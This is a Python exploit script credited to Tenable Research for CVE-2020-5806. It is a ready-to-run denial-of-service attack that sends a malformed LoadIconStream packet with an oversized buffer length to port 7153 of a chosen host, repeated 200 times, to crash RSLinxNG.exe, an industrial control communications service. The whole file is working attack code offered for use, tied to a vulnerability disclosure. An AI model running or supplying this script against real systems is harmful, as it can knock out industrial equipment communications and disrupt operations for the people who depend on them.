##
# Exploit Title: LoadIconStream Denial of Service
# Date: 12/28/2020
# Exploit Author: Tenable Research
# CVE : CVE-2020-5806
# Advisory: https://www.tenable.com/security/research/tra-2020-71
##

import socket, argparse, struct
import random, hexdump

def block(data, pad=False):
  dlen = len(data)
  if (pad and dlen % 4):
    data += b'\x00' * (4 - dlen % 4)
  return struct.pack('<L', len(data))  + data

def rna_msg(hdr, data):
  header = ''
  for k, v in sorted(hdr.items()):
    if v is None: v = ''
    header += '{}={}\x00'.format(k, v)

  msg = b'rna\xF2' + block(header.encode(), True) + block(data)
  return msg


def dump(title, data):
  print('[--- %s ---]' % (title))
  hexdump.hexdump(data)


# MAIN
# 
descr  = 'This script attempts to terminate RSLinxNG.exe.'
 
parser = argparse.ArgumentParser(description=descr)
parser.add_argument('host', help='Target host')
parser.add_argument('-p', '--port', type=int, default=7153, help='Target port, default: %(default)s')

args = parser.parse_args()
host      = args.host
port      = args.port

hdr = {}
hdr['command'] = 'XmlCommand'
hdr['transid'] = 1
hdr['session-id'] = None
data = b'\r\n<LoadIconStream iconFileName="win.ini" bufferSize="4294967295" offset="0" />\x00'
msg = rna_msg(hdr, data)
dump('attack packet', msg)
for i in range(200):
  print('Making connection %04d...' % (i + 1))
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect((host, port))
  print('Sending attack packet...')
  try: 
    s.sendall(msg)
    s.recv(1024)
  except: 
    pass
  s.close()

